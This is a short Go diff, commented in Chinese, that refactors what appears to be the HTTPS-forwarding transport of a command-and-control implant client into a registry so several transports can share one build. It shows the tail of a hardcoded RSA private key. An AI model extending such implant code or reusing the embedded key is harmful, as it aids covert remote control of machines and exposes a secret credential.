@@ -1,4 +1,4 @@
-//go:build transport_https_forward
+//go:build transport_https_forward || transport_multi
 
 package main
 
@@ -65,11 +65,15 @@ AQKBgF4Cyq3HyqOpwM+SIQGbzh6Rv++wFnsz1KogEsUe0qq/2881qxK/KcsjrANR
 eavNHHV14OXF1zVp6FtNG5l2yrtukU6qtqEQGdZmafigU0Wgl+5U4LegeN13WPj9
 fBxkSkP/AgS2XaZzS+My85TrH3PkE5KswGNtsiBMVFpzhHJR
 -----END RSA PRIVATE KEY-----`
-// listenerType 监听器类型（服务端 patch 与 FirstBlood 用）
-const listenerType = "https_forward"
 
 // NewTransport 构造 https_forward 传输（单二进制 build tag 入口）
-func NewTransport() transportClient {
+// init 注册到运行时传输表（多传输构建下按 scheme 选择；单传输构建下只有自己）
+func init() {
+	registerTransport("https_forward", newHTTPSForwardTransport)
+	listenerType = "https_forward"
+}
+
+func newHTTPSForwardTransport() transportClient {
 	return &HTTPSForwardClient{reconnectMgr: reconnect.NewReconnectManager()}
 }
 
